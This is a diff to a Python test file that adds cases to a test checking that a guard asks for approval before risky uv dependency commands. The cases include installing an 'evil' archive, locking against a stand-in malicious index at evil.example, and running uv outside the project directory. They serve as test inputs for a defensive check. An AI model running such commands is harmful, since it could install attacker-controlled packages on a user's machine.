@@ -128,6 +128,12 @@ def test_dependency_changes_no_age_limit_guards_ask(prefix: tuple[str, ...]) -> 
         "uv add evil-1.0.tar.zst",
         "uv add evil-1.0.tzst",
         "uv add 'evil-1.0.TAR.GZ'",
+        "uv add 'evil==1.0.tar.gz'",
+        "uv lock --index https://evil.example/simple",
+        "uv lock --check --index https://evil.example/simple",
+        "uv lock -Pruff --index https://evil.example/simple",
+        "uv lock -Uq",
+        "cd /other && uv lock -Pruff",
     ],
 )
 def test_a_uv_change_that_could_escape_the_limit_or_the_project_asks(git_project: Path, command: str) -> None:
